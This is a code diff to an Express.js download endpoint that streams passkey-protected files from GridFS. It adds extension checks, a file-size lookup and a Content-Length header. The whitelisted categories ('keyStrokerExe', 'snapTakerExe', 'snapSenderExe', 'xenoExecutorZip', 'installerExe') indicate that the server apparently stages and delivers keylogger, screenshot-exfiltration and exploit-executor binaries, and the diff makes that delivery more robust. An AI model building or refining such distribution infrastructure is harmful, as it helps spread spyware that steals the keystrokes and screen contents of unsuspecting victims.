@@ -1174,31 +1174,45 @@ app.get('/download/:category', async (req, res) => {
   const { category } = req.params;
   const { passkey } = req.query;
 
-  // Validate passkey
   if (passkey !== process.env.DOWNLOAD_PASSKEY) {
     console.log(`Invalid passkey attempt for category: ${category}`);
     return res.status(403).send('Forbidden');
   }
 
-  // Validate category
   if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
     console.log(`Invalid category download attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
 
   try {
-    // Find the most recent file for the given category
     const fileMetadata = await FileMetadata.findOne({ category })
-      .sort({ uploadDate: -1 }); // Sort by uploadDate descending to get the most recent
+      .sort({ uploadDate: -1 });
     if (!fileMetadata) {
       console.log(`File not found for category: ${category}`);
       return res.status(404).send('File not found');
     }
 
-    // Stream file from GridFS
+    // Validate file extension matches category
+    const expectedExtension = category === 'xenoExecutorZip' ? '.zip' : '.exe';
+    if (!fileMetadata.filename.toLowerCase().endsWith(expectedExtension)) {
+      console.log(`File ${fileMetadata.filename} does not match expected extension ${expectedExtension} for category: ${category}`);
+      return res.status(400).send(`File does not match category extension: expected ${expectedExtension}`);
+    }
+
+    // Get the file size from GridFS
+    const fileInfo = await bucket.find({ _id: fileMetadata.fileId }).toArray();
+    if (!fileInfo.length) {
+      console.log(`File not found in GridFS for ID: ${fileMetadata.fileId}`);
+      return res.status(404).send('File not found');
+    }
+    const fileSize = fileInfo[0].length;
+
+    console.log(`Sending file: ${fileMetadata.filename}, size: ${fileSize} bytes, hash: ${fileMetadata.hash}`);
+
     const downloadStream = bucket.openDownloadStream(fileMetadata.fileId);
     res.setHeader('Content-Type', 'application/octet-stream');
     res.setHeader('Content-Disposition', `attachment; filename="${fileMetadata.filename}"`);
+    res.setHeader('Content-Length', fileSize); // Add Content-Length header
     res.setHeader('X-File-Hash', fileMetadata.hash);
 
     downloadStream.on('error', (err) => {
